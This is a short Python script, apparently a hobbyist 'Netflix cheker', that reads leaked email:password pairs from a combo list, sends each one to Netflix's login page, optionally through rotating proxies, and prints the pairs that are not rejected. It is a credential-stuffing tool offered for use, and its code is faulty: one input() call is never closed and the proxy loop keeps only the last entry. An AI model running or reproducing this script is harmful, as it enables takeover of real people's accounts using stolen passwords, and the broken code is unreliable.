import requests
import os

clear = lambda: os.system("cls")
def main_menu():
  print("CHEKER MADE BY JAY :) \n")
  print("MAIN MENU")
  print("================================================")
  print("[1] NETFLIX CHEKER")
  print("[2] QUIT")
main_menu()



def options():
  option = input("Pick a option: ")
  if option == "1":
    None
  else: exit()
options()


clear()

proxy_type = input("[*] Proxy Type (http/https/socks5) | Enter nothing to use without Proxy: "


  

  
with open("proxy.txt", "r") as proxy_file:
  proxies = proxy_file.readlines()
  for proxy in proxies:
    proxy_username = proxy.split(":")[0]
    proxy_password = proxy.split(":")[1]
    proxy_host = proxy.split(":")[2]
    proxy_port = proxy.split(":")[3]
    proxy_formatted = f"{proxy_type}://{proxy_username}:{proxy_password}@{proxy_host}:{proxy_port}"
    if proxy_type != "": proxy_auth = {"all://": proxy_formatted}
    else: proxy_auth = {"all://": None}
clear()


def netflix_cheker():
 with open("combolist.txt","r") as f:
    combolist = f.readlines()
    for combo in combolist:
      kek = combo.split(":")
      email = kek[0]
      password = kek[1]
      headers = {
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"
          }
      login_data = {
            "userLoginId": email,
            "password": password
          }
      r = requests.post("https://www.netflix.com/hr-en/login",data=login_data,headers=headers,proxies=proxy_auth if proxy_type != "" else None)
          
      if "Incorrect password. Please try again or you can reset your password." not in r.text:
            print("Good:",email+":"+password)
    
netflix_cheker()  
    
  
  
  
    
    
